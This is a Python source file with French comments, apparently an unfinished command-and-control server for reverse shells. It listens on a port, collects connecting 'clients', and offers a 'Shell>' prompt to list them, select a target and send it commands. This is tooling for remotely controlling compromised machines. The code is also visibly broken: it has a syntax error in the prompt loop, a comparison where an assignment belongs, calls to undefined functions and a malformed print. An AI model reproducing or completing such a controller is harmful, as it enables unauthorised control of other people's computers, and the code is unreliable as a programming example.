import socket #pour la connection
import sys #pour les commandes systèmes
import threading # pour que le serveur puisse gérer plusieurs client à la fois
from queue import Queue

THREADS = 2 # Nombre de thread
NUMBER = [1, 2] # thread 1 et 2 -> dans une liste
queue = Queue()
connections = [] # liste1 = ce qui se rapporte à la connection elle même
addresses = [] #liste2 = ce qui se rapporte au adresse ip, quel client se connecte, ...

# Créer un socket pour initier une connection
def socket_creation():
    try:
        global host #variable global pour être utilisée plus tard dans une autre fonction
        global port
        global sock
        host = '192.168.1.12' #l'ip ou le sever sera à l'écoute (lui même dans ce cas)
        port = 9999 #le port sur lequel il sera à l'écoute pour recevoir des infos
        sock = socket.socket()
    except socket.error as msg: #Si la création du socket échoue on renvoit le message suivant
        print("Socket creation error: " + str(msg))

#En attente de connection
def socket_bind():
    try:
        global host #On réutilise les variables globales créer plus tôt
        global port
        global sock
        print("Binding socket to port: " + str(port))
        sock.bind((host, port)) #on spécifie le port l'adresse sur laquelle écouter
        sock.listen(5) #en attente de connection, 5 tentatives de connection avant de refuser l'acces
    except socket.error as msg:
        print("socket binding error: ", + str(msg) + "\n" + "Please retry ...")
        socket_bind() #donc si erreur, on relance la fonction !

# Accepter la connection avec les clients et les sauvegarde sous forme de liste
def accept_socket():
    for c in connections:  # Fermer toutes les connections
        c.close()
    del connections[:]  # être sur de démmarer sur une bonne base en nettoyant toutes les connections et adresses
    del addresses[:]
    while 1:
        try:
            conn, address = sock.accept()
            conn.setblocking(1)  #pas de "timeout"
            connections.append(conn)  #ajout des connections et adresses à leur liste
            addresses.append(address)
            print("\nConnection established on " + address[0] + ":" + address[1])  #Affiche l'IP et le PORT
        except:
            print("Error while accepting the connection ...")


    """
    conn, address = sock.accept() #attendre que la connection se fasse et afficher le message qui suit avec les infos sur l'ip et le port du client
    print("Connection established on " + "IP " + address[0] + ":" + str(address[1]))
    send_commands(conn) #Fonction qui permettra d'envoyer des commandes
    conn.close()
    """

# Shell
def start_prompt():
    while True:
        cmd = input('Shell> ')
        if == 'lstc':
            list_connection()  #Liste les connections
            continue
        elif 'select' in cmd:
            conn == get_trgt(cmd)  #Selectionne une cible dans la liste des connections grâce à un index
            if conn is not None:
                send_trgt_cmd(conn)
        else:
            print("Command not found ! Try another one or \"help\"")

# Montre les connections actives
def list_connection():
    result = ''
    for i, conn in enumerate(connections): #enumerate permet de ne pas utiliser d'indices
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)  # gros buffer car bcp d'infos
        except:  # Au cas ou il y aurait une mauvaise connection
            del connections[i]
            del addresses[i]
            continue
        result += str(i) + '   ' + str(addresses[i][0]) + ':' + str(addresses[i][1]) + '\n'
    print("###### List of Clients ######" + "\n" + result)
"""
def send_commands(conn):
    while True: #connection constante (boucle infinie)
        cmd = input()
        if cmd == 'stop':
            conn.close()
            sock.close()
            sys.exit()
        if len(str.encode(cmd)) > 0: #>0 pour ne pas envoyer des trames réseau pour rien si elles sont vide !
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8") #1024 pour le buffer et encodage utf-8 pour la lisibilité car on utilise bytes et string
            print(client_response, end="")

def main(): #creation d'une fonction qui contient chaque étape (sauf l'envoie de commandes car il se fait déjà dans la fonction accept_socket()
    socket_creation()
    socket_bind()
    accept_socket()

main() #Appel de la fonction principale
"""

